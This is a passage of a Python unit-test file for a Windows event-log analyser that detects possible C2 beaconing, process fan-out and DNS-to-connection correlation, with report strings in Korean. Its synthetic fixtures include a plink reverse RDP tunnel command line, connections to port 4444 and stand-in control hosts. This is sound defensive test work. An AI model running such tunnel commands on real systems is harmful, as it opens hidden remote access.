                    "ProcessGuid": guid,
                    "ProcessId": "88",
                    "Image": image,
                    "Initiated": "true",
                    "DestinationIp": "8.8.4.4",
                    "DestinationPort": "443",
                },
            )
            for index in range(1, 4)
        ]
        reused_start = _event(
            "1",
            start + timedelta(seconds=40),
            record_id="start-reused-guid",
            data={"ProcessGuid": guid, "ProcessId": "88", "Image": image},
        )
        reused_connections = [
            _event(
                "3",
                start + timedelta(seconds=40 + 5 * index),
                record_id=f"reused-guid-{index}",
                data={
                    "ProcessGuid": guid,
                    "ProcessId": "88",
                    "Image": image,
                    "Initiated": "true",
                    "DestinationIp": "8.8.4.4",
                    "DestinationPort": "443",
                },
            )
            for index in range(1, 4)
        ]

        analysis = analyze_events(
            _result(
                [
                    old_start,
                    *old_connections,
                    termination,
                    *post_termination_connections,
                    reused_start,
                    *reused_connections,
                ]
            ),
            None,
            None,
        )

        groups = analysis["network_activity"]["connections"]
        self.assertEqual(len(groups), 3)
        self.assertEqual({item["connection_count"] for item in groups}, {3})
        self.assertEqual(len({item["process_instance_id"] for item in groups}), 3)
        self.assertFalse(any(item["possible_beacon"] for item in groups))
        self.assertFalse(
            any(
                item["rule_id"] == "possible_network_beacon"
                for item in analysis["findings"]
            )
        )

    def test_hostname_less_connection_uses_exact_dns_query_result_ip(self) -> None:
        start = datetime(2026, 9, 12, tzinfo=timezone.utc)
        dns = _event(
            "22",
            start,
            record_id="dns",
            data={
                "ProcessId": "912",
                "QueryName": "control.example.test",
                "QueryResults": "type: 5 name: alias.example;::ffff:8.8.8.8;",
            },
        )
        connection = _event(
            "5156",
            start + timedelta(seconds=2),
            record_id="net",
            provider=SECURITY_PROVIDER,
            channel="Security",
            data={
                "ProcessID": "912",
                "Application": r"\device\harddiskvolume3\tools\agent.exe",
                "Direction": "%%14593",
                "DestAddress": "8.8.8.8",
                "DestPort": "4444",
                "Protocol": "6",
            },
        )

        analysis = analyze_events(_result([dns, connection]), None, None)

        context = _finding(
            analysis, "suspicious_network_connection"
        )["network_context"]
        self.assertEqual(context["destination_hostname"], "control.example.test")
        self.assertEqual(context["dns_queries"], ["control.example.test"])
        self.assertTrue(
            any("QueryResults" in reason for reason in context["correlation_reasons"])
        )

    def test_hostname_less_connection_rejects_mismatched_dns_result(self) -> None:
        start = datetime(2026, 9, 13, tzinfo=timezone.utc)
        dns = _event(
            "22",
            start,
            data={
                "ProcessId": "913",
                "QueryName": "unrelated.example.test",
                "QueryResults": "1.1.1.1",
            },
        )
        connection = _event(
            "5156",
            start + timedelta(seconds=1),
            provider=SECURITY_PROVIDER,
            channel="Security",
            data={
                "ProcessID": "913",
                "Application": r"\device\harddiskvolume3\tools\agent.exe",
                "Direction": "%%14593",
                "DestAddress": "8.8.8.8",
                "DestPort": "4444",
                "Protocol": "6",
            },
        )

        analysis = analyze_events(_result([dns, connection]), None, None)

        context = _finding(
            analysis, "suspicious_network_connection"
        )["network_context"]
        self.assertIsNone(context["destination_hostname"])
        self.assertEqual(context["dns_queries"], [])
        self.assertFalse(
            any("QueryResults" in reason for reason in context["correlation_reasons"])
        )

    def test_pid_dns_before_process_termination_is_not_attached_after_reuse(self) -> None:
        start = datetime(2026, 9, 13, 1, tzinfo=timezone.utc)
        process = _event(
            "1",
            start,
            record_id="old-start",
            data={"ProcessId": "42", "Image": r"C:\Temp\old.exe"},
        )
        dns = _event(
            "22",
            start + timedelta(seconds=1),
            record_id="old-dns",
            data={
                "ProcessId": "42",
                "QueryName": "old-control.example.test",
                "QueryResults": "8.8.8.8",
            },
        )
        termination = _event(
            "5",
            start + timedelta(seconds=2),
            record_id="old-stop",
            data={"ProcessId": "42", "Image": r"C:\Temp\old.exe"},
        )
        connection = _event(
            "5156",
            start + timedelta(seconds=3),
            record_id="new-net",
            provider=SECURITY_PROVIDER,
            channel="Security",
            data={
                "ProcessID": "42",
                "Application": r"\device\harddiskvolume3\temp\old.exe",
                "Direction": "%%14593",
                "DestAddress": "8.8.8.8",
                "DestPort": "4444",
                "Protocol": "6",
            },
        )

        analysis = analyze_events(
            _result([process, dns, termination, connection]), None, None
        )

        context = _finding(
            analysis, "suspicious_network_connection"
        )["network_context"]
        self.assertIsNone(context["destination_hostname"])
        self.assertEqual(context["dns_queries"], [])
        self.assertFalse(
            any(item["event_id"] == "22" for item in _finding(
                analysis, "suspicious_network_connection"
            )["evidence"])
        )

    def test_process_guid_connection_does_not_fall_back_to_pid_only_dns(self) -> None:
        start = datetime(2026, 9, 13, 2, tzinfo=timezone.utc)
        dns = _event(
            "22",
            start,
            data={
                "ProcessId": "43",
                "QueryName": "wrong-instance.example.test",
                "QueryResults": "8.8.8.8",
            },
        )
        connection = _event(
            "3",
            start + timedelta(seconds=1),
            data={
                "ProcessGuid": "{99999999-1111-2222-3333-444444444444}",
                "ProcessId": "43",
                "Image": r"C:\Temp\new.exe",
                "Initiated": "true",
                "DestinationIp": "8.8.8.8",
                "DestinationPort": "4444",
            },
        )

        analysis = analyze_events(_result([dns, connection]), None, None)

        context = _finding(
            analysis, "suspicious_network_connection"
        )["network_context"]
        self.assertIsNone(context["destination_hostname"])
        self.assertEqual(context["dns_queries"], [])

    def test_exact_dns_result_survives_many_closer_decoy_candidates(self) -> None:
        connection_time = datetime(2026, 9, 13, 3, 10, tzinfo=timezone.utc)
        guid = "{12121212-aaaa-bbbb-cccc-121212121212}"
        exact_dns = _event(
            "22",
            connection_time - timedelta(minutes=4),
            record_id="exact-dns",
            data={
                "ProcessGuid": guid,
                "ProcessId": "44",
                "QueryName": "control.example.test",
                "QueryResults": "8.8.8.8",
            },
        )
        decoys = [
            _event(
                "22",
                connection_time - timedelta(seconds=index),
                record_id=f"decoy-{index}",
                data={
                    "ProcessGuid": guid,
                    "ProcessId": "44",
                    "QueryName": f"decoy-{index}.example.test",
                    "QueryResults": "1.1.1.1",
                },
            )
            for index in range(1, 50)
        ]
        connection = _event(
            "3",
            connection_time,
            record_id="network",
            data={
                "ProcessGuid": guid,
                "ProcessId": "44",
                "Image": r"C:\Windows\System32\svchost.exe",
                "Initiated": "true",
                "DestinationIp": "8.8.8.8",
                "DestinationPort": "4444",
            },
        )

        analysis = analyze_events(
            _result([exact_dns, *decoys, connection]), None, None
        )

        context = _finding(
            analysis, "suspicious_network_connection"
        )["network_context"]
        self.assertEqual(context["destination_hostname"], "control.example.test")
        self.assertEqual(context["dns_queries"], ["control.example.test"])
        activity = analysis["network_activity"]
        self.assertTrue(activity["dns_correlation_candidate_limit_reached"])
        self.assertTrue(activity["truncated"])
        self.assertIn("DNS 시간창 후보", activity["limitation"])

    def test_same_dns_name_merges_rotating_destination_ips(self) -> None:
        start = datetime(2026, 9, 14, tzinfo=timezone.utc)
        guid = "{12345678-aaaa-bbbb-cccc-123456789abc}"
        events: list[EventRecord] = []
        for index, destination_ip in enumerate(("8.8.8.8", "1.1.1.1")):
            events.extend(
                [
                    _event(
                        "22",
                        start + timedelta(seconds=index * 10),
                        record_id=f"dns-{index}",
                        data={
                            "ProcessGuid": guid,
                            "ProcessId": "914",
                            "QueryName": "rotate.example.test",
                            "QueryResults": destination_ip,
                        },
                    ),
                    _event(
                        "3",
                        start + timedelta(seconds=index * 10 + 1),
                        record_id=f"net-{index}",
                        data={
                            "ProcessGuid": guid,
                            "ProcessId": "914",
                            "Image": r"C:\Users\alice\Downloads\agent.exe",
                            "Initiated": "true",
                            "DestinationIp": destination_ip,
                            "DestinationPort": "4444",
                        },
                    ),
                ]
            )

        analysis = analyze_events(_result(events), None, None)

        groups = analysis["network_activity"]["connections"]
        self.assertEqual(len(groups), 1)
        self.assertEqual(groups[0]["destination_hostname"], "rotate.example.test")
        self.assertEqual(groups[0]["connection_count"], 2)
        self.assertEqual(set(groups[0]["destination_ips"]), {"8.8.8.8", "1.1.1.1"})

    def test_c2_score_exposes_versioned_evidence_components(self) -> None:
        start = datetime(2026, 9, 15, tzinfo=timezone.utc)
        process = _event(
            "1",
            start,
            record_id="proc",
            data={
                "ProcessGuid": "{eeeeeeee-1111-2222-3333-444444444444}",
                "ProcessId": "915",
                "Image": r"C:\Users\alice\Downloads\plink.exe",
                "CommandLine": "plink.exe -R 3389:127.0.0.1:3389 -enc AAAA",
                "ParentImage": r"C:\Windows\System32\cmd.exe",
            },
        )
        connection = _event(
            "3",
            start + timedelta(seconds=1),
            record_id="net",
            data={
                "ProcessGuid": "{eeeeeeee-1111-2222-3333-444444444444}",
                "ProcessId": "915",
                "Image": r"C:\Users\alice\Downloads\plink.exe",
                "Initiated": "true",
                "DestinationIp": "8.8.8.8",
                "DestinationPort": "4444",
            },
        )

        analysis = analyze_events(_result([process, connection]), None, None)

        context = _finding(
            analysis, "suspicious_network_connection"
        )["network_context"]
        self.assertTrue(context["c2_candidate"])
        self.assertEqual(context["c2_score"], 100)
        self.assertEqual(context["c2_score_level"], "high")
        self.assertEqual(context["c2_score_version"], 1)
        self.assertEqual(
            set(context["c2_score_components"]),
            {
                "high_risk_port",
                "nonstandard_port",
                "user_writable_process",
                "suspicious_command",
                "known_tunnel_client",
                "unusual_network_process",
            },
        )
        report, _ = generate_rule_report(analysis)
        self.assertIn("C2 통신 후보(휴리스틱): 예", report)
        self.assertIn("C2 휴리스틱 점수: 100 / 수준: high", report)
        self.assertIn("실제 명령제어 통신 판정이 아닙니다", report)

    def test_risky_process_fanout_creates_one_process_level_finding(self) -> None:
        start = datetime(2026, 9, 16, tzinfo=timezone.utc)
        events = [
            _event(
                "3",
                start + timedelta(seconds=index * 10),
                record_id=str(index),
                data={
                    "ProcessGuid": "{ffffffff-1111-2222-3333-444444444444}",
                    "ProcessId": "916",
                    "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "Initiated": "true",
                    "DestinationIp": f"8.8.8.{index + 1}",
                    "DestinationPort": "443",
                },
            )
            for index in range(12)
        ]

        analysis = analyze_events(_result(events), None, None)

        findings = [
            item
            for item in analysis["findings"]
            if item["rule_id"] == "possible_process_fanout"
        ]
        self.assertEqual(len(findings), 1)
        context = findings[0]["network_context"]
        self.assertEqual(context["fanout_destination_count"], 12)
        self.assertEqual(context["connection_count"], 12)
        self.assertTrue(context["c2_candidate"])
        self.assertIn("process_fanout", context["c2_score_components"])
        self.assertEqual(
            analysis["network_activity"]["process_fanout_candidate_count"], 1
        )
        report, _ = generate_rule_report(analysis)
        self.assertIn(
            "C2 통신 후보(휴리스틱): 1건 (목적지 그룹 0건 / 프로세스 fan-out 1건)",
            report,
        )
        self.assertNotIn("의심 통신 그룹: 0건", report)

    def test_normal_browser_cdn_fanout_is_not_a_candidate_by_itself(self) -> None:
        start = datetime(2026, 9, 17, tzinfo=timezone.utc)
        events = [
            _event(
                "3",
                start + timedelta(seconds=index * 5),
                record_id=str(index),
                data={
                    "ProcessGuid": "{abababab-1111-2222-3333-444444444444}",
                    "ProcessId": "917",
                    "Image": r"C:\Users\alice\AppData\Local\Google\Chrome\chrome.exe",
                    "Initiated": "true",
                    "DestinationIp": f"8.8.9.{index + 1}",
                    "DestinationHostname": f"cdn-{index}.example.test",
                    "DestinationPort": "443",
                },
            )
            for index in range(25)
        ]

        analysis = analyze_events(_result(events), None, None)

        self.assertFalse(
            any(
                item["rule_id"] == "possible_process_fanout"
                for item in analysis["findings"]
            )
        )
        self.assertEqual(
            analysis["network_activity"]["process_fanout_candidate_count"], 0
        )

    def test_large_group_reports_exact_count_and_representative_evidence(self) -> None:
        start = datetime(2026, 9, 18, tzinfo=timezone.utc)
        events = [
            _event(
                "3",
                start + timedelta(minutes=index),
                record_id=str(index),
                data={
                    "ProcessGuid": "{cdcdcdcd-1111-2222-3333-444444444444}",
                    "ProcessId": "918",
                    "Image": r"C:\Windows\System32\svchost.exe",
                    "Initiated": "true",
                    "DestinationIp": "8.8.8.8",
                    "DestinationPort": "443",
                },
            )
            for index in range(100)
        ]

        analysis = analyze_events(_result(events), None, None)

        finding = _finding(analysis, "possible_network_beacon")
        self.assertEqual(finding["event_count"], 100)
        self.assertEqual(len(finding["evidence"]), 32)
        self.assertTrue(analysis["suspicious_event_scope"]["evidence_truncated"])
        self.assertTrue(
            analysis["network_activity"]["observation_sample_truncated"]
        )

    def test_large_pid_only_group_does_not_lose_middle_connection_count(self) -> None:
        start = datetime(2026, 9, 19, tzinfo=timezone.utc)
        events = [
            _event(
                "5156",
                start + timedelta(minutes=index),
                record_id=str(index),
                provider=SECURITY_PROVIDER,
                channel="Security",
                data={
                    "ProcessID": "919",
                    "Application": r"\device\harddiskvolume3\windows\system32\svchost.exe",
                    "Direction": "%%14593",
                    "DestAddress": "8.8.4.4",
                    "DestPort": "443",
                    "Protocol": "6",
                },
            )
            for index in range(100)
        ]

        analysis = analyze_events(_result(events), None, None)

        groups = analysis["network_activity"]["connections"]
        self.assertEqual(len(groups), 1)
        self.assertEqual(groups[0]["connection_count"], 100)
        self.assertEqual(groups[0]["sampled_connection_count"], 32)
        self.assertTrue(groups[0]["evidence_sampled"])
        self.assertTrue(analysis["network_activity"]["truncated"])


def _event(
    event_id: str,
    time: datetime,
    *,
    record_id: str = "1",
    provider: str = SYSMON_PROVIDER,
    channel: str = SYSMON_CHANNEL,
    host: str = "HOST-A",
    data: dict[str, str] | None = None,
) -> EventRecord:
    return EventRecord(
        source_file="network.evtx",
        event_id=event_id,
        provider=provider,
        channel=channel,
        computer=host,
        time_created=time,
        record_id=record_id,
        event_data=data or {},
    )


def _result(events: list[EventRecord]) -> ParseResult:
    return ParseResult(
        records=events,
        files=[],
        errors=[],
        total_seen=len(events),
        total_in_range=len(events),
    )


def _finding(analysis: dict[str, object], rule_id: str) -> dict[str, object]:
    findings = analysis["findings"]
    assert isinstance(findings, list)
    for finding in findings:
        if isinstance(finding, dict) and finding.get("rule_id") == rule_id:
            return finding
    raise AssertionError(f"finding not found: {rule_id}; got {findings}")


if __name__ == "__main__":
    unittest.main()
